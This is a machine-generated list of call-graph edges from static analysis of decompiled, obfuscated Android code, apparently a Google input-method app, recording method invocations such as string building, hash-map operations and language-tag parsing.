SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("must be power of 2 between 2^1 and 2^30: ") in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int size()>() in <ljf: boolean isEmpty()> ==> <ljf: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Object: java.lang.Object clone()>() in <lkg: void g(int)> ==> <java.lang.Object: java.lang.Object clone()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Set: int size()>() in <ljf: int size()> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r0.<ivv: void <init>(byte[])>(null) in <ivw: ivv I()> ==> <ivv: void <init>(byte[])>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag") in <ivw: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lin: void <init>(ldp,lqd)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lvs: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lsm: int a(lsz)>($r1) in <lsm: java.lang.Object d(lsz)> ==> <lsm: int a(lsz)>
SPECIAL edge: specialinvoke $r5.<java.text.SimpleDateFormat: void <init>(java.lang.String)>("yyyy-MM-dd\'T\'HH:mm:ss.SSSZ") in <lsc: void f(java.lang.String,ltn)> ==> <java.text.SimpleDateFormat: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(19) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r11.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r4.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqo: void <init>(lkx,lkq)> ==> <lma: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": logging error [") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $i0 = staticinvoke <izw: int ac(int)>($i0) in <izw: int ad(java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.lang.Object e(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: java.lang.Object e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <ivw: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String substring(int)>(1) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.String substring(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <qj: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: $r0 = staticinvoke <lmo: lqs G(java.util.Comparator)>($r1) in <lme: lma l(java.util.Comparator)> ==> <lmo: lqs G(java.util.Comparator)>
VIRTUAL edge: virtualinvoke $r3.<lmb: void g(java.lang.Object,java.lang.Object)>($r5, $r11) in <hbv: void j()> ==> <lmb: void g(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $r3 = staticinvoke <lri: java.util.ArrayList P(java.util.Iterator)>($r2) in <izw: java.util.Collection at(java.lang.Iterable)> ==> <lri: java.util.ArrayList P(java.util.Iterator)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljd: void q(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Enum: int hashCode()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lji: void <init>(java.util.Comparator)> ==> <lqd: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <llg: void <init>(llo)> ==> <lsa: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r0, $r1) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>($r4, $r5, $r2) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>($r2, $i5, $i1, null) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Duplicated extension singleton: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsp: java.lang.String b()> ==> <java.lang.String: java.lang.String replace(char,char)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r1, $r5) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lrg: void <init>(java.lang.Object)>($r0) in <lma: lma r(java.lang.Object)> ==> <lrg: void <init>(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>($r2, $l1, $r0) in <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>
SPECIAL edge: specialinvoke $r9.<lta: void <init>(lsr,java.lang.Object)>($r3, $r7) in <lsn: boolean ac()> ==> <lta: void <init>(lsr,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean k(char)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(4) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/future/FluentFuture") in <her: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete extension subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i4 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <dwx: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<mij: void <init>(miy)>($r1) in <her: void <init>(miy)> ==> <mij: void <init>(miy)>
STATIC edge: $r3 = staticinvoke <lkq: lkq q()>() in <lmo: lqs G(java.util.Comparator)> ==> <lkq: lkq q()>
SPECIAL edge: specialinvoke r0.<java.io.InputStream: void <init>()>() in <bek: void <init>(java.nio.ByteBuffer)> ==> <java.io.InputStream: void <init>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lin: void <init>(ldp,lqd)> ==> <lqd: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: void h()>
SPECIAL edge: specialinvoke $r0.<lpi: void <init>(java.lang.String,int)>("KEY", 0) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void g(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void g(java.lang.String)>
CLINIT edge: staticinvoke <java.util.logging.Level: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.logging.Level: void <clinit>()>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r3, $i3) in <lma: lma i(int,java.lang.Object[])> ==> <lri: void t(java.lang.Object,int)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<java.util.Map: java.lang.Object get(java.lang.Object)>($r4) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void l(int)>($i6) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void l(int)>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r7, $i5) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
CLINIT edge: staticinvoke <lsl: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsl: void <clinit>()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hns: void <init>()> ==> <iec: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <ljb: void <init>(ljd,int)> ==> <lid: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: $r11 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <ivv: ivw i(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(13) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <jsg: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jsg: void <clinit>()>
VIRTUAL edge: $r5 = virtualinvoke $r19.<java.lang.ThreadLocal: java.lang.Object get()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.ThreadLocal: java.lang.Object get()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r9 = virtualinvoke $r6.<lly: lma g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: lma g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>($r2) in <gwk: void <init>()> ==> <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <j$.sun.misc.b: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.sun.misc.b: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lum: lvm i()>() in <lum: lvt k()> ==> <lum: lvm i()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t find the Unsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<llo: void <init>(lkx,int)>($r2, $i0) in <lme: void <init>(lkx,int)> ==> <llo: void <init>(lkx,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
SPECIAL edge: $r4 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r2) in <ivv: ivw a()> ==> <ivv: ivw i(java.lang.String)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r4, $i2, 2) in <nzh: boolean f(ivv)> ==> <iwt: void g(char[],int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null searchFeature") in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: boolean isAssignableFrom(java.lang.Class)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <ljd: ljd g()>() in <lli: void <init>()> ==> <ljd: ljd g()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(20) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lvt: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c2) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.String getName()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <lkh: java.lang.Object[] toArray()> ==> <lkh: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r7.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: void <init>(java.util.List)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(3) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke $r1.<ljf: void <init>()>() in <lmb: java.util.Collection b()> ==> <ljf: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r6.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <nzh: boolean f(ivv)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "metadata key") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.List: java.lang.Object get(int)>($i1) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: java.lang.Object get(int)>
CLINIT edge: staticinvoke <lqq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqq: void <clinit>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r3) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>($r3, $r2) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lje: java.lang.Object next()>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: int o(int,int,int,int)> ==> <ljf: java.lang.Object p()>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljd: int z(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r1, $i0, $i1, $r2) in <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 97, 122, $i0) in <iwt: java.lang.String e(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r2) in <iye: void I(boolean,java.lang.Object)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <ltf: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: $i4 = specialinvoke r0.<ljf: int n()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int n()>
STATIC edge: $r7 = staticinvoke <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>($r6) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lso: void <init>()> ==> <lsq: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <ljf: java.util.Iterator iterator()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(1) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>(1, "skipFrames must be >= 0") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqo: lsa l()> ==> <lkq: lsb B()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map m()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map m()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(14) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r8.<ivw: void <init>()>() in <ivw: void <clinit>()> ==> <ivw: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("BitmojiImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
